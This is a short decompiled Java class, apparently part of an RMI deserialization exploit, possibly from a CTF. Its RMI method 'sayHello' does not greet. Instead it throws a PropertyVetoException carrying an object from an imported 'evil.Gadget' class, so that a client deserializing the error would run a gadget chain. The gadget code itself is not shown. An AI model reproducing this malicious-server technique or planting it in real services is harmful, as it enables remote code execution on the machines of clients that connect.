/*
 * Decompiled with CFR 0.151.
 */
package com.yxxx;

import evil.Gadget;

import java.beans.PropertyChangeEvent;
import java.beans.PropertyVetoException;
import java.rmi.RemoteException;

public class UserImpl implements UserInter {
    @Override
    public String sayHello(String var1) throws RemoteException {
        try {
            PropertyChangeEvent event = new PropertyChangeEvent("source", "name", "old",
                    Gadget.get());
            throw new PropertyVetoException("mess", event);
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
    }
}

